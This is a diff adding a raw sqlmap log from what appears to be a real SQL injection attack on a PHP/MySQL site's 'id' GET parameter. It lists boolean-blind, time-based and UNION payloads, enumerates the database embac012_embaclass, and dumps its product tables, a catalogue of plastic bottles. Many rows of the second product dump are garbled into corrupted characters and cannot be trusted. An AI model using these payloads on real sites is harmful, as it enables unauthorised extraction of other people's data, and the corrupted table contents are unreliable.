@@ -1,0 +1,303 @@
+sqlmap identified the following injection point(s) with a total of 173 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=17 AND 1958=1958
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=17 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 25 columns
+    Payload: id=17 UNION ALL SELECT 4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,CONCAT(0x717a767171,0x6b555a576b6272415a624d42416c776f56784153434147526e4958517a6f714d4d4e506e534f436f,0x7178706b71),4878,4878,4878,4878,4878,4878#
+    Vector:  UNION ALL SELECT 1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,[QUERY],1149,1149,1149,1149,1149,1149#
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] embac012_embaclass
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=17 AND 1958=1958
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=17 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 25 columns
+    Payload: id=17 UNION ALL SELECT 4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,CONCAT(0x717a767171,0x6b555a576b6272415a624d42416c776f56784153434147526e4958517a6f714d4d4e506e534f436f,0x7178706b71),4878,4878,4878,4878,4878,4878#
+    Vector:  UNION ALL SELECT 8322,8322,8322,8322,8322,8322,8322,8322,8322,8322,8322,8322,8322,8322,8322,8322,8322,8322,[QUERY],8322,8322,8322,8322,8322,8322#
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+Database: embac012_embaclass
+[7 tables]
++------------+
+| bocal      |
+| linhas     |
+| material   |
+| produtos   |
+| terminacao |
+| tipo       |
+| volume     |
++------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=17 AND 1958=1958
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=17 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 25 columns
+    Payload: id=17 UNION ALL SELECT 4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,CONCAT(0x717a767171,0x6b555a576b6272415a624d42416c776f56784153434147526e4958517a6f714d4d4e506e534f436f,0x7178706b71),4878,4878,4878,4878,4878,4878#
+    Vector:  UNION ALL SELECT 8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,[QUERY],8876,8876,8876,8876,8876,8876#
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+Database: embac012_embaclass
+[7 tables]
++------------+
+| bocal      |
+| linhas     |
+| material   |
+| produtos   |
+| terminacao |
+| tipo       |
+| volume     |
++------------+
+
+Database: embac012_embaclass
+Table: bocal
+[5 entries]
++----------+---------------------+
+| bocal_id | bocal_nome          |
++----------+---------------------+
+| 1        | FLIP-TOP            |
+| 2        | ROSCA               |
+| 3        | RECRAVE             |
+| 4        | TAMPA OVAL FLIP-TOP |
+| 5        | TAMPA LACRE         |
++----------+---------------------+
+
+Database: embac012_embaclass
+Table: linhas
+[13 entries]
++----------+-----------------+------------+-------------------+
+| linha_id | linha_img       | linha_desc | linha_nome        |
++----------+-----------------+------------+-------------------+
+| 1        | infiniti-bn.jpg | <blank>    | Infiniti          |
+| 2        | <blank>         | <blank>    | Elite             |
+| 3        | <blank>         | <blank>    | Fashion           |
+| 4        | <blank>         | <blank>    | Cilindrica - PEAD |
+| 5        | PVC-bn.jpg      | <blank>    | PVC               |
+| 6        | <blank>         | <blank>    | Ombro Reto        |
+| 7        | <blank>         | <blank>    | Tube              |
+| 8        | <blank>         | <blank>    | Potes             |
+| 9        | <blank>         | <blank>    | Saboneteira       |
+| 10       | <blank>         | <blank>    | Pulverizador      |
+| 11       | <blank>         | <blank>    | Bisnagas          |
+| 12       | <blank>         | <blank>    | Oval              |
+| 13       | <blank>         | <blank>    | Ampola            |
++----------+-----------------+------------+-------------------+
+
+Database: embac012_embaclass
+Table: material
+[6 entries]
++-------------+---------------+
+| material_id | material_nome |
++-------------+---------------+
+| 1           | PEAD          |
+| 2           | PEAD/PP       |
+| 3           | PET           |
+| 4           | PVC           |
+| 5           | PP            |
+| 6           | PE            |
++-------------+---------------+
+
+Database: embac012_embaclass
+Table: produtos
+[8 entries]
++---------+----------+----------+-----------+------------+-------------+--------------+--------------+--------------+--------------+-----------------------------------+-------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+--------------------------------+-----------------------------------+---------------------------+
+| tipo_id | bocal_id | linha_id | volume_id | produto_id | material_id | termina_id_4 | termina_id_1 | termina_id_3 | termina_id_2 | produto_img                       | produto_obs | produto_desc                                                                                                                                                                                                                                              | produto_img4 | produto_img2                   | produto_img3                      | produto_nome              |
++---------+----------+----------+-----------+------------+-------------+--------------+--------------+--------------+--------------+-----------------------------------+-------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+--------------------------------+-----------------------------------+---------------------------+
+| 1       | 0        | 10       | 18        | 2          | 1           | 0            | 5            | 0            | 0            | pulverizador/PulverizadorPEAD.jpg | <blank>     | Opc?a?o de acabamento: soft-touch.<br>Disponi?vel em cores meta?licas e leitosas.                                                                                                                                                                         | <blank>      | <blank>                        | <blank>                           | Pulverizador 500ml - PEAD |
+| 1       | 0        | 10       | 18        | 3          | 3           | 0            | 5            | 0            | 0            | pulverizador/PulverizadorPET.jpg  | <blank>     | <blank>                                                                                                                                                                                                                                                   | <blank>      | <blank>                        | <blank>                           | Pulverizador 500ml - PET  |
+| 1       | 0        | 1        | 11        | 4          | 1           | 0            | 4            | 0            | 0            | infiniti/Infiniti200-ft.jpg       | <blank>     | <blank>                                                                                                                                                                                                                                                   | <blank>      | infiniti/Infiniti200-24415.jpg | infiniti/Infiniti200-24-415-2.jpg | Frasco 200ml              |
+| 1       | 0        | 1        | 14        | 5          | 1           | 0            | 4            | 0            | 8            | infiniti/Infiniti300-24415-2.jpg  | <blank>     | Opc?a?o de acabamento: soft-touch.<br>Disponi?vel em cores meta?licas e leitosas.<br>A linha possui a opc?a?o de customizac?a?o do Flip top em duas cores na volumetria 200ml.<br> Os ane?is podem ser coloridos, leitosos, transparentes ou metalizados. | <blank>      | infiniti/Infiniti300-24415.jpg | <blank>                           | Frasco 300ml              |
+| 1       | 0        | 1        | 18        | 6          | 1           | 0            | 5            | 0            | 0            | infiniti/Infiniti500-28410-2.jpg  | <blank>     | Opc?a?o de acabamento: soft-touch.<br>Disponi?vel em cores meta?licas e leitosas.<br>A linha possui a opc?a?o de customizac?a?o do Flip top em duas cores na volumetria 300ml.<br> Os ane?is podem ser coloridos, leitosos, transparentes ou metalizados. | <blank>      | infiniti/Infiniti500-28410.jpg | <blank>                           | Frasco 500ml              |
+| 1       | 0        | 1        | 20        | 7          | 1           | 0            | 5            | 0            | 0            | infiniti/Infiniti1L-28-2.jpg      | <blank>     | Opc?a?o de acabamento: soft-touch.<br>Disponi?vel em cores meta?licas e leitosas.                                                                                                                                                                         | <blank>      | infiniti/Infiniti1l-28.jpg     | <blank>                           | Frasco 1000ml             |
+| 1       | 0        | 2        | 14        | 8          | 1           | 0            | 3            | 0            | 4            | elite/Elite30024-410.jpg          | <blank>     | Opc?a?o de acabamento: soft-touch.<br>Disponi?vel em cores meta?licas e leitosas.                                                                                                                                                                         | 0            | elite/Elite300-24-410.jpg      | elite/Elite300-24-415.jpg         | Frasco Elite 300ml        |
+| 1       | 0        | 2        | 18        | 9          | 1           | 0            | 5            | 0            | 0            | elite/Elite500-2840.jpg           | <blank>     | Opc?a?o de acabamento: soft-touch. Disponi?vel em cores meta?licas e leitosas Tampas disc-top e flip-top com opc?o?es de filetes metalizado prata ou dourado.                                                                                             | <blank>      | elite/Elite500-28410-2.jpg     | elite/Elite500-28-410-3.jpg       | Frasco Elite 500ml        |
++---------+----------+----------+-----------+------------+-------------+--------------+--------------+--------------+--------------+-----------------------------------+-------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+--------------------------------+-----------------------------------+---------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=17 AND 1958=1958
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=17 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 25 columns
+    Payload: id=17 UNION ALL SELECT 4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,CONCAT(0x717a767171,0x6b555a576b6272415a624d42416c776f56784153434147526e4958517a6f714d4d4e506e534f436f,0x7178706b71),4878,4878,4878,4878,4878,4878#
+    Vector:  UNION ALL SELECT 3502,3502,3502,3502,3502,3502,3502,3502,3502,3502,3502,3502,3502,3502,3502,3502,3502,3502,[QUERY],3502,3502,3502,3502,3502,3502#
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+Database: embac012_embaclass
+[7 tables]
++------------+
+| bocal      |
+| linhas     |
+| material   |
+| produtos   |
+| terminacao |
+| tipo       |
+| volume     |
++------------+
+
+Database: embac012_embaclass
+Table: bocal
+[5 entries]
++----------+---------------------+
+| bocal_id | bocal_nome          |
++----------+---------------------+
+| 1        | FLIP-TOP            |
+| 2        | ROSCA               |
+| 3        | RECRAVE             |
+| 4        | TAMPA OVAL FLIP-TOP |
+| 5        | TAMPA LACRE         |
++----------+---------------------+
+
+Database: embac012_embaclass
+Table: linhas
+[13 entries]
++----------+-----------------+------------+-------------------+
+| linha_id | linha_img       | linha_desc | linha_nome        |
++----------+-----------------+------------+-------------------+
+| 1        | infiniti-bn.jpg | <blank>    | Infiniti          |
+| 2        | <blank>         | <blank>    | Elite             |
+| 3        | <blank>         | <blank>    | Fashion           |
+| 4        | <blank>         | <blank>    | Cilindrica - PEAD |
+| 5        | PVC-bn.jpg      | <blank>    | PVC               |
+| 6        | <blank>         | <blank>    | Ombro Reto        |
+| 7        | <blank>         | <blank>    | Tube              |
+| 8        | <blank>         | <blank>    | Potes             |
+| 9        | <blank>         | <blank>    | Saboneteira       |
+| 10       | <blank>         | <blank>    | Pulverizador      |
+| 11       | <blank>         | <blank>    | Bisnagas          |
+| 12       | <blank>         | <blank>    | Oval              |
+| 13       | <blank>         | <blank>    | Ampola            |
++----------+-----------------+------------+-------------------+
+
+Database: embac012_embaclass
+Table: material
+[6 entries]
++-------------+---------------+
+| material_id | material_nome |
++-------------+---------------+
+| 1           | PEAD          |
+| 2           | PEAD/PP       |
+| 3           | PET           |
+| 4           | PVC           |
+| 5           | PP            |
+| 6           | PE            |
++-------------+---------------+
+
+Database: embac012_embaclass
+Table: produtos
+[31 entries]
++---------+----------+----------+-----------+------------+-------------+--------------+--------------+--------------+--------------+------------------------------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+--------------------------------+-----------------------------------+---------------------------+
+| tipo_id | bocal_id | linha_id | volume_id | produto_id | material_id | termina_id_4 | termina_id_1 | termina_id_3 | termina_id_2 | produto_img                        | produto_obs | produto_desc                                                                                                                                                                                                                                                 | produto_img4 | produto_img2                   | produto_img3                      | produto_nome              |
++---------+----------+----------+-----------+------------+-------------+--------------+--------------+--------------+--------------+------------------------------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+--------------------------------+-----------------------------------+---------------------------+
+| 1       | 0        | 10       | 18        | 2          | 1           | 0            | 5            | 0            | 0            | pulverizador/PulverizadorPEAD.jpg  | <blank>     | Opc?a?o de acabamento: soft-touch.<br>Disponi?vel em cores meta?licas e leitosas.                                                                                                                                                                            | <blank>      | <blank>                        | <blank>                           | Pulverizador 500ml - PEAD |
+| 1       | 0        | 10       | 18        | 3          | 3           | 0            | 5            | 0            | 0            | pulverizador/PulverizadorPET.jpg   | <blank>     | <blank>                                                                                                                                                                                                                                                      | <blank>      | <blank>                        | <blank>                           | Pulverizador 500ml - PET  |
+| 1       | 0        | 1        | 11        | 4          | 1           | 0            | 4            | 0            | 0            | infiniti/Infiniti200-ft.jpg        | <blank>     | <blank>                                                                                                                                                                                                                                                      | <blank>      | infiniti/Infiniti200-24415.jpg | infiniti/Infiniti200-24-415-2.jpg | Frasco 200ml              |
+| 1       | 0        | 1        | 14        | 5          | 1           | 0            | 4            | 0            | 8            | infiniti/Infiniti300-24415-2.jpg   | <blank>     | Opc?a?o de acabamento: soft-touch.<br>Disponi?vel em cores meta?licas e leitosas.<br>A linha possui a opc?a?o de customizac?a?o do Flip top em duas cores na volumetria 200ml.<br> Os ane?is podem ser coloridos, leitosos, transparentes ou metalizados.    | <blank>      | infiniti/Infiniti300-24415.jpg | <blank>                           | Frasco 300ml              |
+| 1       | 0        | 1        | 18        | 6          | 1           | 0            | 5            | 0            | 0            | infiniti/Infiniti500-28410-2.jpg   | <blank>     | Opc?a?o de acabamento: soft-touch.<br>Disponi?vel em cores meta?licas e leitosas.<br>A linha possui a opc?a?o de customizac?a?o do Flip top em duas cores na volumetria 300ml.<br> Os ane?is podem ser coloridos, leitosos, transparentes ou metalizados.    | <blank>      | infiniti/Infiniti500-28410.jpg | <blank>                           | Frasco 500ml              |
+| 1       | 0        | 1        | 20        | 7          | 1           | 0            | 5            | 0            | 0            | infiniti/Infiniti1L-28-2.jpg       | <blank>     | Opc?a?o de acabamento: soft-touch.<br>Disponi?vel em cores meta?licas e leitosas.                                                                                                                                                                            | <blank>      | infiniti/Infiniti1l-28.jpg     | <blank>                           | Frasco 1000ml             |
+| 1       | 0        | 2        | 14        | 8          | 1           | 0            | 3            | 0            | 4            | elite/Elite30024-410.jpg           | <blank>     | Opc?a?o de acabamento: soft-touch.<br>Disponi?vel em cores meta?licas e leitosas.                                                                                                                                                                            | 0            | elite/Elite300-24-410.jpg      | elite/Elite300-24-415.jpg         | Frasco Elite 300ml        |
+| 1       | 0        | 2        | 18        | 9          | 1           | 0            | 5            | 0            | 0            | elite/Elite500-2840.jpg            | <blank>     | Opc?a?o de acabamento: soft-touch. Disponi?vel em cores meta?licas e leitosas Tampas disc-top e flip-top com opc?o?es de filetes metalizado prata ou dourado.                                                                                                | <blank>      | elite/Elite500-28410-2.jpg     | elite/Elite500-28-410-3.jpg       | Frasco Elite 500ml        |
+| 1       | 0        | 10       | 18        | 2          | 1           | 0            | 5            | 0            | 0            | pulverizadoq/PulqerizadorPEAD.jpg  | <blank>     | Opc?a?o de acabamento: soft-touch. Disponi?vel em cores meta?licas e leitosas Tampas disc-top e flip-top com opc?o?es de filetes metalizado prata ou dourado                                                                                                 | <blank>      | <blank>                        | <blank>                           | Pqlverizaaoq 50/ml - PEAD |
+| 1       | 0        | 10       | 18        | 2          | 1           | 0            | 5            | 0            | 0            | paeverizadIr/EuaveriiQaorPEAB\tjMg | <blank>     | Acc1a\tkaaaaaaaaqd!?eg2a!q??aa-Aeeacna!aabci?Fa?2????!A!\rQU\n"?k?itisaEI?o??\td??-sop???i/c bo?pc"?esa?9iieqe??=?a\ti???\tprat!AoCad%                                                                                           | <blank>      | <blank>                        | <blank>                           | Pulverizador 100mg % PEAA |
+| 1       | 0        | 10       | 18        | 2          | 1           | 0            | 5            | 0            | 0            | Aulverizador/Aqave???dorPAD?jp?  | <blank>     | Iac?a%bca?aaaaam\nnEe#aacA?c?sag!bc!AEIYEbHaIE??\r?!????\r'\tA\r?\t?!\t??????p?1??\t??\n?Q ?iA-?o??oA?\t\naeile?C?eal"?do???ta?u?durabA.                                                                                  | <blank>      | <blank>                        | <blank>                           | Puiverizador500ml - PEAD |
+| 1       | 0        | 10       | 18        | 2          | 1           | 0            | 5            | 0            | 0            | mulvaqaaador!PulverizaaorPEAD.jag  | <blank>     | Aea?a!E?aaaaaaaacaa1saaa!aece!"a!%\taai?ab+Ba!???\tao\t??\rY\t*l!CF???!o)???AAgBa\nA!I)?i????o??%?\t??\te?)ts?!ealaz?? p?at??u ?o?ado?                                                                                     | <blank>      | <blank>                        | <blank>                           | Aulverizador?500ml - PEAD |
+| 1       | 0        | 10       | 18        | 2          | 1           | 0            | 5            | 0            | 0            | Aulverizador/Pulverizad?????D.???  | <blank>     | Aea1a9adaaaaaaaaaa9aaaq%tcacb+e1A?aaeaa!eel\r?aa?\rm?a9?a'Pr?ii?g???a\\@sai1=-soa1i\r?tp\r????a???q ??fa1e?? i1tal?z!d\tpa9@ doFAado.                                                                                       | <blank>      | <blank>                        | <blank>                           | Pulverizacor 500ml- PEAD |
+| 1       | 0        | 10       | 18        | 2          | 1           | 0            | 5            | 0            | 0            | pqlverizador/PulqacizaaorPEAD.jpg  | <blank>     | !'\r?a!c?ae?aaaba\namaa??qbaa!daba",aa?CBQb>ab!baa\re?c???j\ns???i?1?????\r!?s?A\t&\rb5 9\ra?9I*N?%A??!??\t]?E????Di\nO?e 1qka21\rpratB ?qa\t?ado9B?>DWan?i*pida\rer?Oiiai@s,laitoqos,?sransp?rentes ou me?alizados. | <blank>      | <blank>                        | <blank>                           | Pulverizador 500ml - PEAD |
+| 1       | 0        | 10       | 18        | 2          | 1           | 0            | 5            | 0            | 0            | pulverizador/PulverizadorPEAD.jpg  | <blank>     | Amb#a!b aeaaabamce3a9sibt Aouag)!aC!AisBhe$veA?mDr`sm@a?`ca??AAblqas.<aq>Tampa??di?)?d a ? ih-r@p comoac?o?as?de fil?ts msalizadoq praha nu douraco.1br>Osaie=iqpodem.\trcooqidos aitosos,t anFpare.ses aa metali?ados.             | <blank>      | <blank>                        | <blank>                           | Pulverizador500ml - PEAD |
+| 1       | 0        | 10       | 18        | 2          | 1           | 0            | 5            | 0            | 0            | pulverizador/Pulve?izadorPE?A.?p  | <blank>     | A?c\ta5adeaAaaaaaaqa6kiaq)aa\ta!CaFmbb!uaaci??r@?AJ??%??2????\n?\t1\t\t!\r\t?#?!Bco??a/!\t?esde?A!9? ?AB?izado?pr!t\t o? dourado.                                                                                 | <blank>      | <blank>                        | <blank>                           | Pulveqizador 500ml - PEAD |
+| 1       | 0        | 10       | 18        | 2          | 1           | 0            | 5            | 0            | 0            | pulverizador/PulverizadorPEAD.jpg  | <blank>     | Oca?a*o ceaaaaame qa:0cMt'r`ua?$DaIaanb2vb`am\tcoqe2 meta?iicas \r laiqo@as.<ba= Tampasdisc%top\tc f?p?a?p com opc?o?es de filetes mtal^zado prata ou dourado.                                                                                        | <blank>      | <blank>                        | <blank>                           | Pulverizador 500ml - AEAA |
+| 1       | 0        | 10       | 18        | 2          | 1           | 0            | 5            | 0            | 0            | pulverizador/PulverizadorPEAD.jpg  | <blank>     | Eca!a1oca aaabacaaqa!?aoat(tjAaE?AiaCaAA!aea?Am\noqea??e?a=j?base ?ei@os?s.!r5 SamZas disc-@oI a?aiL-(op com opc?o?es ?e filetes metalizado prata ou dourado.                                                                                          | <blank>      | <blank>                        | <blank>                           | Pulvarizador 500ml - PEAD |
+| 1       | 0        | 2        | 18        | 9          | 1           | 0            | 5            | 0            | 0            | elite/Elite500-2840.jpg            | <blank>     | IAIa"a?ae\naaaaa?a?qc$?AaAa\tmIqad?AARBFAP\t!BAAAf?seL\nicaqA!)itAaH.<bT??pa??Xscc\r^lg-gop com oac'o?qC figete it(lizado pr\tta\tou dourdo.                                                                                    | <blank>      | elite/Elite500-2?41?-2.jpg     | ekite/Elite500-28-410-3.jpg       | Frasco Elite 500ml        |
+| 1       | 0        | 2        | 18        | 9          | 1           | 0            | 5            | 0            | 0            | elite/Elite500-2840.jpg            | <blank>     | Aea?a2B daababaabbaa:?dcaa)taaYa??CAYanBB?aAaAC??ores??es?>libas b?leitoV?s+5?q= Tampas disc-top efaip%toa com opc?o?es??ef0lees aetaliyado prataoq douraao.                                                                                           | <blank>      | elite/Elite500-28410-2-jpP     | elite/Elite500-28-410-3.jpg       | Frasco Elite 500ml        |
+| 1       | 0        | 2        | 20        | 10         | 1           | 0            | 5            | 0            | 0            | elite/Elite1L3.jpg                 | <blank>     | <blank>                                                                                                                                                                                                                                                      | <blank>      | elite/Elite1L.jpg              | elite/Elite1L2.jpg                | Frasco Elite 1000ml       |
+| 1       | 0        | 2        | 20        | 10         | 1           | 0            | 5            | 0            | 0            | elite/Elite1L3.jpg                 | <blank>     | <blank>                                                                                                                                                                                                                                                      | <blank>      | elite/Elite1L.jpg              | elite/Elite1L2.jpg                | Frasco Elite 1000ml       |
+| 1       | 0        | 3        | 14        | 11         | 1           | 0            | 7            | 0            | 4            | fashion/Faqhion300-22.jpg          | <blank>     | <blank>                                                                                                                                                                                                                                                      | <blank>      | fashion/Fashion300-24.jpg      | <blank>                           | Frasco Fashion 300ml      |
+| 1       | 0        | 3        | 14        | 11         | 1           | 0            | 7            | 0            | 4            | fashion/Fashion300-22.jpg          | <blank>     | <blank>                                                                                                                                                                                                                                                      | <blank>      | fashion/Fashioa300-24.jpg      | <blank>                           | Frasco Fashion 300ml      |
+| 1       | 0        | 3        | 18        | 12         | 1           | 0            | 7            | 0            | 5            | fashhb1/asCaP`5/(22!jpg          | <blank>     | <blank>                                                                                                                                                                                                                                                      | <blank>      | Pashion/Fashion500-28.jpg      | aashioa#Bashian500-28-2.jpg       | Frasco Fashion 500ml      |
+| 1       | 0        | 3        | 18        | 12         | 1           | 0            | 7            | 0            | 5            | HashHon/Fashion500-22.jpg          | <blank>     | O1?ao cbacaFabemGX9?roct-topcb A_hebi?vbT a ?Pesicta;4i"a#eYbiORss.\naiIqdQ1c\t? e?f?-??'?E# Hp]?a?4?de?i?O_ $eqa9?zadopra a os\tourada.                                                                                            | <blank>      | fashion/Fashion500-28.jpg      | fashion/Fashion500-28-2.jpg       | Frasco Fashion 500ml      |
+| 1       | 0        | 3        | 20        | 13         | 1           | 0            | 7            | 0            | 5            | faqhion/Fashion1l-22.jpg           | <blank>     | Oac=a9A da !AAa]@A2oYo DsDsa.Di4HMSY$ee?eg aoqeY1esa?h=7as\taaW`t0sa? amqdiCct?p?e fimtmaaog @p??o erae fij99es\tmetali?ao?pra?a iu?dour?do.                                                                                             | <blank>      | fashion/Fashion1I-28-1.jpg     | fashion/Fashion1L-28.j?g          | Frasco Fashion 1L         |
+| 1       | 0        | 3        | 20        | 13         | 1           | 0            | 7            | 0            | 5            | aaqhion/Fashion1l-22.jpg           | <blank>     | i")a!?ae?acaaaaaat?3ia%aa?ca!AbaeBAa!AeRIR???m?!?i!???\ta??I???a?p! d??c?\to??el!p-\t\n ??? o!???es d ??lea?? met?lizado ?rat? o d u@ado.                                                                                           | <blank>      | fashion/Fashion1L-28-2.jpg     | fGshion/Fashion1L-28.jpg          | Frasco Fashion 1L         |
+| 1       | 0        | 7        | 18        | 14         | 1           | 0            | 5            | 0            | 0            | tube/Tube500-28-2.jpg              | <blank>     | <blank>                                                                                                                                                                                                                                                      | <blank>      | tube/Tube500-28.jpg            | <blank>                           | Frasco Tube 500ml         |
+| 1       | 0        | 7        | 18        | 14         | 1           | 0            | 5            | 0            | 0            | tube/Tube500-28-2.jpg              | <blank>     | Ccc!a#a dGaaAGaceAAE?AACA?AAAMh-?ACImnS?KAB?Cm?an`c?a%a*\t?c` elc0t bas. Lipa ciqc*toY?a?l?p-t'p b^ opc?c0e? de fil;@s j?_.aizaaP Irataou\ndou+do.                                                                                             | <blank>      | tube/Tube500-28.jpg            | <blank>                           | Frasco Tube 500ml         |
+| 1       | 0        | 7        | 20        | 15         | 1           | 0            | 5            | 0            | 0            | tube/Tube1L-28-2.jpg               | <blank>     | Aoa?a!ace?acaaaEbaAA1?sAet-skC'aAirAiAIqelam??irsbaa=kica@?!\nleio@a?-Saamaad%-?p?e\na?C?tU?!??:\n??es f?l\n??\tal?za? raa ou douado?                                                                                          | <blank>      | tube/Tube1L-28.jpg             | <blank>                           | Frasco Tube 1L            |
++---------+----------+----------+-----------+------------+-------------+--------------+--------------+--------------+--------------+------------------------------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+--------------------------------+-----------------------------------+---------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=17 AND 1958=1958
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=17 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 25 columns
+    Payload: id=17 UNION ALL SELECT 4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,4878,CONCAT(0x717a767171,0x6b555a576b6272415a624d42416c776f56784153434147526e4958517a6f714d4d4e506e534f436f,0x7178706b71),4878,4878,4878,4878,4878,4878#
+    Vector:  UNION ALL SELECT 4144,4144,4144,4144,4144,4144,4144,4144,4144,4144,4144,4144,4144,4144,4144,4144,4144,4144,[QUERY],4144,4144,4144,4144,4144,4144#
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+Database: embac012_embaclass
+[7 tables]
++------------+
+| bocal      |
+| linhas     |
+| material   |
+| produtos   |
+| terminacao |
+| tipo       |
+| volume     |
++------------+
+
